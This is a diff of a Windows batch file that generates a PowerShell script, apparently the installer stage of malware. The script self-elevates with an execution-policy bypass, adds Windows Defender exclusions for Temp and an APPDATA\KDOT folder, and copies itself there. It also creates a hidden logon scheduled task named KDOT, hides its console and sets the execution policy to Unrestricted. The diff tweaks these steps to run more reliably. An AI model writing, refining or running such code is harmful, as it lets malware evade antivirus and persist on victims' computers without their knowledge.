@@ -1,10 +1,7 @@
 @echo off
 
 net session >nul 2>&1
-if not %errorlevel% == 0 (
-    powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
-    exit /b 0
-)
+if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0 )
 
 echo function CHECK_IF_ADMIN { > powershell123.ps1
 echo $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) >> powershell123.ps1
@@ -164,13 +161,13 @@ echo } >> powershell123.ps1
 echo function Invoke-TASKS { >> powershell123.ps1
 echo Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell123.ps1
 echo Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" >> powershell123.ps1
-echo New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" >> powershell123.ps1
+echo New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force >> powershell123.ps1
 echo $origin = $PSCommandPath >> powershell123.ps1
-echo Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
+echo Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force >> powershell123.ps1
 echo $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
 echo $batch_code = "powershell -ExecutionPolicy Bypass -File $scriptPath" >> powershell123.ps1
 echo $batch_path = "$env:APPDATA\KDOT\KDOT.bat" >> powershell123.ps1
-echo Set-Content -Path $batch_path -Value $batch_code -Encoding ASCII >> powershell123.ps1
+echo Set-Content -Path $batch_path -Value $batch_code -Encoding ASCII -Force >> powershell123.ps1
 echo $task_name = "KDOT" >> powershell123.ps1
 echo $task_action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $batch_path" >> powershell123.ps1
 echo $task_trigger = New-ScheduledTaskTrigger -AtLogOn >> powershell123.ps1
@@ -233,7 +230,7 @@ echo Hide-Console >> powershell123.ps1
 echo Invoke-TASKS >> powershell123.ps1
 echo } else { >> powershell123.ps1
 echo Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell123.ps1
-echo Start-Sleep -s 5 >> powershell123.ps1
+echo Start-Sleep -s 1 >> powershell123.ps1
 echo Request-Admin >> powershell123.ps1
 echo } >> powershell123.ps1
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
